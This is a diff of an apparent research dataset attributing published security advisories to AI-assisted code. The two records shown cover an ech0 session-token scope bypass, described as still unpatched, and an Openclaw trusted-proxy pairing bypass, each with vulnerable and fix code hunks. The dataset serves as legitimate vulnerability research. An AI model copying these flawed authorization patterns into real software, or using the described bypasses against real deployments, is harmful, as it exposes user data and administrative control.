@@ -5,20 +5,20 @@
   "case_count": 312,
   "ai_root_cause": 237,
   "ai_code_flawed": 75,
-  "ledger_total": 29593,
+  "ledger_total": 30196,
   "ledger_reviewed": 3738,
   "ledger_in_progress": 5421,
-  "ledger_not_started": 20434,
-  "confirmed_cases": 222,
-  "qualified_cases": 62,
-  "provisional_cases": 28,
+  "ledger_not_started": 21037,
+  "confirmed_cases": 218,
+  "qualified_cases": 61,
+  "provisional_cases": 33,
   "exact_publication_dates": 312,
   "unknown_publication_dates": 0,
   "date_policy": "GHSA_OR_CVE_PUBLISHED_ONLY",
   "coverage_from": "2025-05-01",
-  "coverage_to": "2026-08-26",
-  "source_cutoff": "2026-08-26",
-  "generated_at": "2026-09-26T17:53:25Z",
+  "coverage_to": "2026-09-26",
+  "source_cutoff": "2026-09-26",
+  "generated_at": "2026-09-26T21:43:34Z",
   "ledger": "artifacts/funnel-account-20260817.jsonl"
  },
  "cause_categories": {
@@ -616,7 +616,7 @@
     "language": "Go",
     "archived": false
    },
-   "contribution_class": "AI_DIRECT_ROOT",
+   "contribution_class": "AI_CODE_FLAWED",
    "candidate_set": [
     "b47fa1c75d890cd080e3f6699bbfca8cd8d4b939"
    ],
@@ -625,26 +625,28 @@
    ],
    "minimum_fix_set": [],
    "gates": {
-    "ai_hunk": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "identity": "PASS",
-    "release": "NARROW",
-    "topology": "PASS",
-    "uniqueness": "PASS"
+    "ai_hunk": "UNKNOWN",
+    "but_for": "UNKNOWN",
+    "fix_reversal": "UNKNOWN",
+    "identity": "UNKNOWN",
+    "release": "UNKNOWN",
+    "topology": "UNKNOWN",
+    "uniqueness": "UNKNOWN"
    },
    "vulnerable_release": {
-    "kind": "git_tag",
-    "tag": "v4.2.1",
-    "version": "4.2.1"
+    "kind": "source_observations",
+    "version": "v4.5.0; dashboard and log-stream remainder in v4.5.1 and inspected main",
+    "tag": null,
+    "as_of_revision": "3f4f405eced0064d71e982ad18e1ea2b39736bf0",
+    "qualification": "Source tags and release page inspected; packaged binary/image equivalence and all historical versions are not established."
    },
    "fixed_release": null,
    "published_at": "2026-08-25",
    "severity": null,
    "cwes": [],
-   "description": "RequireScopes short-circuits with ctx.Next() whenever the JWT typ is session, before any scope or audience check. POST /login issues session tokens, so any authenticated non-admin satisfies JWTAuth/RequireAuth and then skips the only admin gate on routes that attach RequireScopes(admin:user|admin:settings) without a handler/service IsAdmin check. That lets a logged-in non-admin read GET /api/users (emails and admin flags), GET /api/system/logs, GET /api/system/visitor-stats, GET /api/system/check-update, and SSE /api/system/logs/stream. /ws/system/logs is registered on WSRouterGroup with no middleware; the handler only jwtUtil.ParseToken's the query token and never checks IsAdmin, scope, or audience, so the same session JWT tails live system logs.",
+   "description": "AI-assisted scope hardening on the user-list route left ordinary sessions exempt from capability checks and relied on an administrator check that the existing service did not perform. The exposure predated that hardening. Other dashboard routes and the separate WebSocket log path also lack required role authorization, but those independent omissions are not attributed to this change. Version 4.5.1 adds an administrator check for user listing only. Dashboard and log-stream exposure remains in the inspected source revision; no complete advisory repair or binary equivalence is established.",
    "references": [],
-   "mechanism": "RequireScopes short-circuits with ctx.Next() whenever the JWT typ is session, before any scope or audience check. POST /login issues session tokens, so any authenticated non-admin satisfies JWTAuth/RequireAuth and then skips the only admin gate on routes that attach RequireScopes(admin:user|admin:settings) without a handler/service IsAdmin check. That lets a logged-in non-admin read GET /api/users (emails and admin flags), GET /api/system/logs, GET /api/system/visitor-stats, GET /api/system/check-update, and SSE /api/system/logs/stream. /ws/system/logs is registered on WSRouterGroup with no middleware; the handler only jwtUtil.ParseToken's the query token and never checks IsAdmin, scope, or audience, so the same session JWT tails live system logs.",
+   "mechanism": "AI-assisted scope hardening on the user-list route left ordinary sessions exempt from capability checks and relied on an administrator check that the existing service did not perform. The exposure predated that hardening. Other dashboard routes and the separate WebSocket log path also lack required role authorization, but those independent omissions are not attributed to this change.",
    "cause_category": "auth_access",
    "ai_provenance": {
     "family": "cursor",
@@ -654,49 +656,56 @@
    },
    "fix_authorship": null,
    "code_evidence": {
+    "summary": "AI-assisted scope hardening on the user-list route left ordinary sessions exempt from capability checks and relied on an administrator check that the existing service did not perform. The exposure predated that hardening. Other dashboard routes and the separate WebSocket log path also lack required role authorization, but those independent omissions are not attributed to this change. Version 4.5.1 adds an administrator check for user listing only. Dashboard and log-stream exposure remains in the inspected source revision; no complete advisory repair or binary equivalence is established.",
     "candidate_url": "https://github.com/lin-snow/ech0/commit/b47fa1c75d890cd080e3f6699bbfca8cd8d4b939",
     "advisory_url": "https://github.com/advisories/ghsa-q8hh-m6v5-4f3x",
-    "summary": "Cursor-assisted access-control code let ordinary session tokens skip admin-only scope checks. A signed-in non-admin could read user records and system logs; separate code caused the advisory's other exposed routes.",
-    "steps": [
-     {
-      "title": "AI change",
-      "detail": "feat(authz): enforce route-level scope checks for access tokens"
-     }
-    ],
+    "annotation_mode": "hunk_specific",
     "display_hunks": [
      {
       "file": "internal/middleware/scope.go",
-      "code": "@@ -0,0 +1,71 @@\n+package middleware\n+\n+import (\n+\t\"net/http\"\n+\n+\t\"github.com/gin-gonic/gin\"\n+\ti18nUtil \"github.com/lin-snow/ech0/internal/i18n\"\n+\tauthModel \"github.com/lin-snow/ech0/internal/model/auth\"\n+\tcommonModel \"github.com/lin-snow/ech0/internal/model/common\"\n+\terrUtil \"github.com/lin-snow/ech0/internal/util/err\"\n+\t\"github.com/lin-snow/ech0/pkg/viewer\"\n+)\n+\n+func RequireScopes(scopes ...string) gin.HandlerFunc {\n+\treturn func(ctx *gin.Context) {\n+\t\tv := viewer.MustFromContext(ctx.Request.Context())\n+\t\tif v.TokenType() == authModel.TokenTypeSession {\n+\t\t\tctx.Next()\n+\t\t\treturn\n+\t\t}\n+\t\tif v.TokenType() != authModel.TokenTypeAccess {\n+\t\t\tctx.JSON(\n+\t\t\t\thttp.StatusUnauthorized,\n+\t\t\t\tcommonModel.FailWithLocalized[any](\n+\t\t\t\t\ti18nUtil.Localize(i18nUtil.LocalizerFromGin(ctx), commonModel.MsgKeyAuthTokenInvalid, errUtil.HandleError(&commonModel.ServerError{\n+\t\t\t\t\t\tMsg: commonModel.TOKEN_NOT_VALID,\n+\t\t\t\t\t\tErr: nil,\n+\t\t\t\t\t}), nil),\n+\t\t\t\t\tcommonModel.ErrCodeTokenInvalid,\n+\t\t\t\t\tcommonModel.MsgKeyAuthTokenInvalid,\n+\t\t\t\t\tnil,\n+\t\t\t\t),\n+\t\t\t)\n+\t\t\tctx.Abort()\n+\t\t\treturn\n+\t\t}\n+\t\tif !containsAllScopes(v.Scopes(), scopes) {\n+\t\t\tctx.JSON(\n+\t\t\t\thttp.StatusForbidden,\n+\t\t\t\tcommonModel.FailWithLocalized[any](\n+\t\t\t\t\ti18nUtil.Localize(i18nUtil.LocalizerFromGin(ctx), commonModel.MsgKeyCommonRequestFailed, errUtil.HandleError(&commonModel.ServerError{\n+\t\t\t\t\t\tMsg: commonModel.NO_PERMISSION_DENIED,\n+\t\t\t\t\t\tErr: nil,\n+\t\t\t\t\t}), nil),\n+\t\t\t\t\tcommonModel.ErrCodePermissionDenied,\n+\t\t\t\t\tcommonModel.MsgKeyCommonRequestFailed,\n+\t\t\t\t\tnil,\n+\t\t\t\t),\n+\t\t\t)\n+\t\t\tctx.Abort()\n+\t\t\treturn\n+\t\t}\n+\t\tctx.Next()\n+\t}\n+}\n+\n+func containsAllScopes(actual, required []string) bool {\n+\tif len(required) == 0 {\n+\t\treturn true\n+\t}\n+\tset := make(map[string]struct{}, len(actual))\n+\tfor _, scope := range actual {\n+\t\tset[scope] = struct{}{}\n+\t}\n+\tfor _, requiredScope := range required {\n+\t\tif _, ok := set[requiredScope]; !ok {\n+\t\t\treturn false\n+\t\t}\n+\t}\n+\treturn true\n+}",
-      "annotation": "Introduces scope middleware that immediately advances session tokens before validating their required administrative scopes, while access tokens receive explicit type and permission checks.",
-      "role": "candidate"
+      "role": "candidate",
+      "code": "@@ -0,0 +13,10 @@\n+\n+func RequireScopes(scopes ...string) gin.HandlerFunc {\n+\treturn func(ctx *gin.Context) {\n+\t\tv := viewer.MustFromContext(ctx.Request.Context())\n+\t\tif v.TokenType() == authModel.TokenTypeSession {\n+\t\t\tctx.Next()\n+\t\t\treturn\n+\t\t}\n+\t\tif v.TokenType() != authModel.TokenTypeAccess {\n+\t\t\tctx.JSON(\n",
+      "annotation": "Ordinary session tokens leave the scope middleware before capability checks; the affected user-list service still needed a role check.",
+      "source_url": "https://github.com/lin-snow/ech0/commit/b47fa1c75d890cd080e3f6699bbfca8cd8d4b939"
      },
      {
-      "file": "internal/router/setting.go",
-      "code": "@@ -1,6 +1,10 @@\n package router\n \n-import \"github.com/lin-snow/ech0/internal/handler\"\n+import (\n+\t\"github.com/lin-snow/ech0/internal/handler\"\n+\t\"github.com/lin-snow/ech0/internal/middleware\"\n+\tauthModel \"github.com/lin-snow/ech0/internal/model/auth\"\n+)\n \n // setupSettingRoutes 设置设置路由\n func setupSettingRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n@@ -11,38 +15,105 @@ func setupSettingRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {\n \tappRouterGroup.PublicRouterGroup.GET(\"/agent/info\", h.SettingHandler.GetAgentInfo())\n \n \t// Auth\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/settings\", h.SettingHandler.UpdateSettings())\n+\tappRouterGroup.AuthRouterGroup.PUT(\n+\t\t\"/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.UpdateSettings(),\n+\t)\n \n-\tappRouterGroup.AuthRouterGroup.GET(\"/s3/settings\", h.SettingHandler.GetS3Settings())\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/s3/settings\", h.SettingHandler.UpdateS3Settings())\n+\tappRouterGroup.AuthRouterGroup.GET(\n+\t\t\"/s3/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.GetS3Settings(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.PUT(\n+\t\t\"/s3/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.UpdateS3Settings(),\n+\t)\n \n-\tappRouterGroup.AuthRouterGroup.GET(\"/oauth2/settings\", h.SettingHandler.GetOAuth2Settings())\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/oauth2/settings\", h.SettingHandler.UpdateOAuth2Settings())\n-\tappRouterGroup.AuthRouterGroup.GET(\"/passkey/settings\", h.SettingHandler.GetPasskeySettings())\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/passkey/settings\", h.SettingHandler.UpdatePasskeySettings())\n+\tappRouterGroup.AuthRouterGroup.GET(\n+\t\t\"/oauth2/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.GetOAuth2Settings(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.PUT(\n+\t\t\"/oauth2/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.UpdateOAuth2Settings(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.GET(\n+\t\t\"/passkey/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.GetPasskeySettings(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.PUT(\n+\t\t\"/passkey/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.UpdatePasskeySettings(),\n+\t)\n \n-\tappRouterGroup.AuthRouterGroup.GET(\"/webhook\", h.SettingHandler.GetWebhook())\n-\tappRouterGroup.AuthRouterGroup.POST(\"/webhook\", h.SettingHandler.CreateWebhook())\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/webhook/:id\", h.SettingHandler.UpdateWebhook())\n-\tappRouterGroup.AuthRouterGroup.DELETE(\"/webhook/:id\", h.SettingHandler.DeleteWebhook())\n-\tappRouterGroup.AuthRouterGroup.POST(\"/webhook/:id/test\", h.SettingHandler.TestWebhook())\n+\tappRouterGroup.AuthRouterGroup.GET(\n+\t\t\"/webhook\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.GetWebhook(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.POST(\n+\t\t\"/webhook\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.CreateWebhook(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.PUT(\n+\t\t\"/webhook/:id\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.UpdateWebhook(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.DELETE(\n+\t\t\"/webhook/:id\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.DeleteWebhook(),\n+\t)\n+\tappRouterGroup.AuthRouterGroup.POST(\n+\t\t\"/webhook/:id/test\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\th.SettingHandler.TestWebhook(),",
-      "annotation": "Attaches the new administrative scope middleware to settings, storage, OAuth, passkey, and webhook routes that previously accepted any authenticated request.",
-      "role": "candidate"
+      "file": "internal/router/user.go",
+      "role": "candidate",
+      "code": "@@ -26,10 +27,8 @@\n \t)\n \n \t// Auth\n-\tappRouterGroup.AuthRouterGroup.GET(\"/allusers\", h.UserHandler.GetAllUsers())\n-\tappRouterGroup.AuthRouterGroup.GET(\"/user\", h.UserHandler.GetUserInfo())\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/user\", h.UserHandler.UpdateUser())\n-\tappRouterGroup.AuthRouterGroup.DELETE(\"/user/:id\", h.UserHandler.DeleteUser())\n-\tappRouterGroup.AuthRouterGroup.PUT(\"/user/admin/:id\", h.UserHandler.UpdateUserAdmin())\n-\tappRouterGroup.AuthRouterGroup.POST(\"/oauth/:provider/bind\", h.UserHandler.OAuthBind())\n-\tappRouterGroup.AuthRouterGroup.GET(\"/oauth/info\", h.UserHandler.GetOAuthInfo())\n+\tappRouterGroup.AuthRouterGroup.GET(\n+\t\t\"/allusers\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminUser),\n+\t\th.UserHandler.GetAllUsers(),\n+\t)\n",
+      "annotation": "The existing authenticated user-list route gains an administrative capability guard, while session-token authorization still depends on the service.",
+      "source_url": "https://github.com/lin-snow/ech0/commit/b47fa1c75d890cd080e3f6699bbfca8cd8d4b939"
      },
      {
-      "file": "internal/router/router_test.go",
-      "code": "@@ -4,6 +4,7 @@ import (\n \t\"net/http\"\n \t\"net/http/httptest\"\n \t\"testing\"\n+\t\"time\"\n \n \t\"github.com/gin-gonic/gin\"\n \t\"github.com/lin-snow/ech0/internal/database\"\n@@ -22,6 +23,10 @@ import (\n \tsettingHandler \"github.com/lin-snow/ech0/internal/handler/setting\"\n \tuserHandler \"github.com/lin-snow/ech0/internal/handler/user\"\n \twebHandler \"github.com/lin-snow/ech0/internal/handler/web\"\n+\t\"github.com/lin-snow/ech0/internal/middleware\"\n+\tauthModel \"github.com/lin-snow/ech0/internal/model/auth\"\n+\tuserModel \"github.com/lin-snow/ech0/internal/model/user\"\n+\tjwtUtil \"github.com/lin-snow/ech0/internal/util/jwt\"\n \t\"gorm.io/driver/sqlite\"\n \t\"gorm.io/gorm\"\n )\n@@ -85,6 +90,80 @@ func TestSetupRouter_AllUsersRouteProtected(t *testing.T) {\n \t}\n }\n \n+func TestSetupRouter_AccessTokenWithoutRequiredScopeGetsForbidden(t *testing.T) {\n+\tgin.SetMode(gin.TestMode)\n+\tinitTestDatabase(t)\n+\tengine := gin.New()\n+\n+\tapi := engine.Group(\"/api\")\n+\tapi.Use(middleware.NoCache(), middleware.JWTAuthMiddleware())\n+\tapi.PUT(\n+\t\t\"/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\tfunc(ctx *gin.Context) { ctx.Status(http.StatusOK) },\n+\t)\n+\n+\tuser := userModel.User{ID: \"u-1\", Username: \"scope-user\"}\n+\ttoken, err := jwtUtil.GenerateToken(\n+\t\tjwtUtil.CreateAccessClaimsWithExpiry(\n+\t\t\tuser,\n+\t\t\tint64(time.Hour),\n+\t\t\t[]string{authModel.ScopeEchoRead},\n+\t\t\tauthModel.AudiencePublic,\n+\t\t\t\"jti-read-only\",\n+\t\t),\n+\t)\n+\tif err != nil {\n+\t\tt.Fatalf(\"generate token failed: %v\", err)\n+\t}\n+\n+\treq := httptest.NewRequest(http.MethodPut, \"/api/settings\", nil)\n+\treq.Header.Set(\"Authorization\", \"Bearer \"+token)\n+\trec := httptest.NewRecorder()\n+\tengine.ServeHTTP(rec, req)\n+\n+\tif rec.Code != http.StatusForbidden {\n+\t\tt.Fatalf(\"expected status %d, got %d\", http.StatusForbidden, rec.Code)\n+\t}\n+}\n+\n+func TestSetupRouter_AccessTokenWithScopePasses(t *testing.T) {\n+\tgin.SetMode(gin.TestMode)\n+\tinitTestDatabase(t)\n+\tengine := gin.New()\n+\n+\tapi := engine.Group(\"/api\")\n+\tapi.Use(middleware.NoCache(), middleware.JWTAuthMiddleware())\n+\tapi.PUT(\n+\t\t\"/settings\",\n+\t\tmiddleware.RequireScopes(authModel.ScopeAdminSettings),\n+\t\tfunc(ctx *gin.Context) { ctx.Status(http.StatusOK) },\n+\t)\n+\n+\tuser := userModel.User{ID: \"u-2\", Username: \"scope-admin\"}\n+\ttoken, err := jwtUtil.GenerateToken(\n+\t\tjwtUtil.CreateAccessClaimsWithExpiry(\n+\t\t\tuser,\n+\t\t\tint64(time.Hour),\n+\t\t\t[]string{authModel.ScopeAdminSettings},\n+\t\t\tauthModel.AudiencePublic,\n+\t\t\t\"jti-admin\",\n+\t\t),\n+\t)\n+\tif err != nil {\n+\t\tt.Fatalf(\"generate token failed: %v\", err)\n+\t}\n+\n+\treq := httptest.NewRequest(http.MethodPut, \"/api/settings\", nil)\n+\treq.Header.Set(\"Authorization\", \"Bearer \"+token)\n+\trec := httptest.NewRecorder()",
-      "annotation": "Adds router tests proving a read-only access token is rejected while a token carrying the administrative scope reaches the protected endpoint.",
-      "role": "candidate"
+      "file": "internal/service/user/user.go",
+      "role": "before_after",
+      "code": "@@ -402,8 +402,18 @@\n // 返回:\n //   - []model.User: 用户列表（不包含密码信息）\n //   - error: 获取过程中的错误信息\n-func (userService *UserService) GetAllUsers() ([]model.User, error) {\n-\tallures, err := userService.userRepository.GetAllUsers(context.Background())\n+func (userService *UserService) GetAllUsers(ctx context.Context) ([]model.User, error) {\n+\t// Only Admin can get all users\n+\tuserid := viewer.MustFromContext(ctx).UserID()\n+\tcaller, err := userService.userRepository.GetUserByID(ctx, userid)\n+\tif err != nil {\n+\t\treturn nil, err\n+\t}\n+\tif !caller.IsAdmin {\n+\t\treturn nil, errors.New(commonModel.NO_PERMISSION_DENIED)\n+\t}\n+\n+\tallures, err := userService.userRepository.GetAllUsers(ctx)\n \tif err != nil {\n \t\treturn nil, err\n \t}\n",
+      "annotation": "The later user-list change checks the persisted administrator role. This closes only the user-list slice, not the dashboard or log-stream remainder.",
+      "source_url": "https://github.com/lin-snow/ech0/commit/1b8c64d0da2f3df167502af72e95417a1c4578db"
      }
     ],
-    "candidate_patch_sha256": "898f249ac2320ac036fad3143fcfd65ab73c8fa1a8018de530273120609b6472"
+    "candidate_patch_sha256": "0a9a199e45fc4038d5bcb7c06b33084a059a139b14cc07696e44015340637f43",
+    "required_anchors": {
+     "candidate": [
+      "TokenTypeSession"
+     ]
+    },
+    "steps": []
    },
    "ir_chain": null,
    "unpatched": {
     "confirmed": true,
+    "as_of_revision": "3f4f405eced0064d71e982ad18e1ea2b39736bf0",
+    "scope": "Static source-level missing dashboard/session-role checks and the independent log-stream authorization omission.",
+    "reason": "v4.5.1 leaves relevant dashboard/middleware files unchanged. Retained public-main tree matches 41 relevant cached entries; raw source bodies match Git blob IDs. The Huma wrapper tree also matches and its API/middleware/handler wrappers add no compensating business-role check.",
     "potential_fix": {
-     "approach": "Require authentication and scope checks on every remaining dashboard and WebSocket sink.",
-     "rationale": "1b8c64d0 repairs only GetAllUsers."
-    },
-    "reason": "The session-token bypass and middleware-free /ws/system/logs route remain in v5.7.0 and origin/main; no complete fix is verified."
+     "approach": "Enforce server-side administrator-role authorization before sensitive dashboard data and either log-stream transport disclose information, alongside capability checks for access tokens.",
+     "rationale": "Authenticated identity and capability enforcement do not supply the session business-role decision.",
+     "reference_sha": null
+    }
    },
    "advisory_url": "https://github.com/advisories/ghsa-q8hh-m6v5-4f3x",
    "publication_issues": [],
-   "publication_status": "qualified"
+   "publication_status": "provisional"
   },
   {
    "case_id": "GHSA-HW36-J4Q7-VJXX",
@@ -14896,42 +14905,53 @@
     "language": "TypeScript",
     "archived": false
    },
-   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
+   "contribution_class": "AI_DIRECT_ROOT",
    "candidate_set": [
     "20523b918adff4feae378ac9965e204c56b6e3d8"
    ],
    "carrier_set": [],
    "minimum_fix_set": [
-    "96fba91b3a51d6e536f03a4077ef8a11a132578d"
+    "a8d1bd6fe12cbf99feca9a5542e7c00838ef9a4b"
    ],
    "gates": {
-    "ai_hunk": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "identity": "PASS",
-    "release": "PASS",
-    "topology": "PASS",
-    "uniqueness": "PASS"
+    "ai_hunk": "UNKNOWN",
+    "but_for": "UNKNOWN",
+    "fix_reversal": "UNKNOWN",
+    "identity": "UNKNOWN",
+    "release": "UNKNOWN",
+    "topology": "UNKNOWN",
+    "uniqueness": "UNKNOWN"
    },
    "vulnerable_release": {
-    "contains_candidate_ancestor": true,
-    "contains_fix_ancestor": false,
-    "kind": "git_tag",
-    "sha": "f066dd2f31c231f38fbcaacd6f6dfce0801143b3",
-    "tag": "v2026.5.12"
+    "kind": "discontinuous_source_intervals",
+    "version": ">=2026.2.24 <2026.5.4; >=2026.5.12 <2026.5.18",
+    "tag": null,
+    "intervals": [
+     {
+      "introduced": "2026.2.24",
+      "fixed": "2026.5.4"
+     },
+     {
+      "introduced": "2026.5.12",
+      "fixed": "2026.5.18"
+     }
+    ],
+    "qualification": "Source and published provenance support the recommended upgrade. No package execution, tarball comparison, attestation-signature verification or exhaustive historical release certification."
    },
    "fixed_release": {
-    "contains_fix_ancestor": true,
-    "kind": "git_tag",
-    "sha": "50a2481652b6a62d573ece3cead60400dc77020d",
-    "tag": "v2026.5.18"
+    "kind": "source_tag_and_npm_declared_source",
+    "version": "2026.5.18",
+    "tag": "v2026.5.18",
+    "tag_object_sha": "0c5e335df4311f135a36f7f72fcd87784dd01c96",
+    "npm_declared_source_sha": "50a2481652b6a62d573ece3cead60400dc77020d",
+    "qualification": "Source and published provenance support the recommended upgrade. No package execution, tarball comparison, attestation-signature verification or exhaustive historical release certification."
    },
    "published_at": "2026-07-02",
    "severity": null,
    "cwes": [],
-   "description": "Openclaw's gateway can authenticate Control UI sessions through a reverse proxy, and in that mode a client still has to pair a device before the scopes it asks for are trusted. A change shipped in 2026.2.24 made a successful trusted-proxy authentication sufficient to skip pairing and to satisfy the missing-device-identity check, so a connection that presented a fresh, unpaired device identity could request elevated operator scopes and keep them, up to cached operator-admin authority over live gateway calls. A role gate added days later limited the same bypass to operator-role sessions, which left this operator-role scope-binding flaw on the same code path. Release 2026.5.18 removes the proxy pairing bypass, requires pairing before proxy-scoped access, clears unbound scopes and stops issuing device tokens without a paired device identity.",
+   "description": "An AI-assisted trusted-proxy exception let fresh, unapproved Control UI devices retain client-requested scopes before server-side pairing approved them. The original device-less path cleared scopes and must be distinguished from the fresh-device path. Trusted-proxy authentication alone did not establish device privilege. An initial clamp removed unapproved scopes, a later change reintroduced the exception, and a subsequent pairing repair closed that recurrence. Source and published package provenance support discontinuous affected windows, without certifying every historical package or attributing the recurrence to AI.",
    "references": [],
-   "mechanism": "Trusted-proxy Control UI connections were allowed to skip device pairing, so the gateway honored the operator scopes a client declared on its WebSocket connect request before any device identity or pairing baseline was bound to the connection. The connection policy returned a pairing bypass whenever trusted-proxy authentication succeeded, the missing-device-identity check answered allow for the same condition, and the client's declared scopes survived, which let an unpaired or restricted user exercise admin-gated gateway calls for the life of the connection. The repair drops the proxy pairing bypass, requires pairing before proxy-scoped access, clears self-declared scopes when no device identity exists, and stops issuing device tokens on that path.",
+   "mechanism": "An AI-assisted trusted-proxy exception let fresh, unapproved Control UI devices retain client-requested scopes before server-side pairing approved them. The original device-less path cleared scopes and must be distinguished from the fresh-device path. Trusted-proxy authentication alone did not establish device privilege.",
    "cause_category": "auth_access",
    "ai_provenance": {
     "family": "cursor",
@@ -14939,93 +14959,63 @@
     "candidate_count": 1,
     "named_candidate_count": 1
    },
-   "fix_authorship": {
-    "classification": "no_ai_marker",
-    "families": [],
-    "fixes": [
+   "fix_authorship": null,
+   "code_evidence": {
+    "summary": "An AI-assisted trusted-proxy exception let fresh, unapproved Control UI devices retain client-requested scopes before server-side pairing approved them. The original device-less path cleared scopes and must be distinguished from the fresh-device path. Trusted-proxy authentication alone did not establish device privilege. An initial clamp removed unapproved scopes, a later change reintroduced the exception, and a subsequent pairing repair closed that recurrence. Source and published package provenance support discontinuous affected windows, without certifying every historical package or attributing the recurrence to AI.",
+    "candidate_url": "https://github.com/openclaw/openclaw/commit/20523b918adff4feae378ac9965e204c56b6e3d8",
+    "advisory_url": "https://github.com/advisories/ghsa-qjpc-qf9m-xwmr",
+    "annotation_mode": "hunk_specific",
+    "display_hunks": [
      {
-      "sha": "96fba91b3a51d6e536f03a4077ef8a11a132578d",
-      "classification": "no_ai_marker",
-      "author": {
-       "name": "Pavan Kumar Gondhi",
-       "email": "pavangondhi@gmail.com"
-      }
+      "file": "src/gateway/server/ws-connection/connect-policy.ts",
+      "role": "candidate",
+      "code": "@@ -35,7 +35,11 @@\n export function shouldSkipControlUiPairing(\n   policy: ControlUiAuthPolicy,\n   sharedAuthOk: boolean,\n+  trustedProxyAuthOk = false,\n ): boolean {\n+  if (trustedProxyAuthOk) {\n+    return true;\n+  }\n   return policy.allowBypass && sharedAuthOk;\n }\n \n",
+      "annotation": "Successful trusted-proxy authentication bypasses the pairing decision, separating authentication from server approval of device privileges.",
+      "source_url": "https://github.com/openclaw/openclaw/commit/20523b918adff4feae378ac9965e204c56b6e3d8"
+     },
+     {
+      "file": "src/gateway/server/ws-connection/message-handler.ts",
+      "role": "fix",
+      "code": "@@ -1133,8 +1136,12 @@\n               if (!ok) {\n                 return;\n               }\n+              hasServerApprovedDeviceTokenBaseline = true;\n+            } else if (trustedProxyAuthOk) {\n+              clearUnboundScopes();\n             }\n           } else {\n+            hasServerApprovedDeviceTokenBaseline = true;\n             const claimedPlatform = connectParams.client.platform;\n             const pairedPlatform = paired.platform;\n             const claimedDeviceFamily = connectParams.client.deviceFamily;\n",
+      "annotation": "The first closing change clears requested scopes for an unapproved trusted-proxy device rather than trusting its requested privileges.",
+      "source_url": "https://github.com/openclaw/openclaw/commit/a8d1bd6fe12cbf99feca9a5542e7c00838ef9a4b"
+     },
+     {
+      "file": "src/gateway/server/ws-connection/message-handler.ts",
+      "role": "fix",
+      "code": "@@ -1222,9 +1229,10 @@\n           }\n         }\n \n-        const deviceToken = device\n-          ? await ensureDeviceToken({ deviceId: device.id, role, scopes })\n-          : null;\n+        const deviceToken =\n+          device && hasServerApprovedDeviceTokenBaseline\n+            ? await ensureDeviceToken({ deviceId: device.id, role, scopes })\n+            : null;\n         const bootstrapDeviceTokens: Array<{\n           deviceToken: string;\n           role: string;\n",
+      "annotation": "Device-token issuance now requires a server-approved device baseline.",
+      "source_url": "https://github.com/openclaw/openclaw/commit/a8d1bd6fe12cbf99feca9a5542e7c00838ef9a4b"
+     }
+    ],
+    "candidate_patch_sha256": "72c3c50a58cf0469edfc77ba7426cb34e6af6211db2164e37b1fc090e6508ab6",
+    "required_anchors": {
+     "candidate": [
+      "trustedProxyAuthOk"
+     ],
+     "fix": [
+      "clearUnboundScopes"
+     ]
+    },
+    "fix_url": "https://github.com/openclaw/openclaw/commit/a8d1bd6fe12cbf99feca9a5542e7c00838ef9a4b",
+    "fix_files": [
+     "src/gateway/server/ws-connection/message-handler.ts"
+    ],
+    "fix_patch_sha256": "1dbf66727a82cebd9a0e0600b0231f263de98ade9cb4661c6d622f74a5a19282",
+    "steps": [
+     {
+      "title": "fix",
+      "detail": "An initial clamp removed unapproved scopes, a later change reintroduced the exception, and a subsequent pairing repair closed that recurrence. Source and published package provenance support discontinuous affected windows, without certifying every historical package or attributing the recurrence to AI."
      }
     ]
    },
-   "code_evidence": {
-    "advisory_url": "https://github.com/advisories/ghsa-qjpc-qf9m-xwmr",
-    "candidate_patch_sha256": "ccc9db4f3cda502cbd361ad6af12cb5126fc7f0475118a5a4977e2f2845fd3ab",
-    "candidate_url": "https://github.com/openclaw/openclaw/commit/20523b918adff4feae378ac9965e204c56b6e3d8",
-    "display_hunks": [
-     {
-      "annotation": "Successful trusted-proxy authentication made the pairing decision return skip and let a connection without device identity pass, so the operator scopes a client declared were trusted before pairing bound them.",
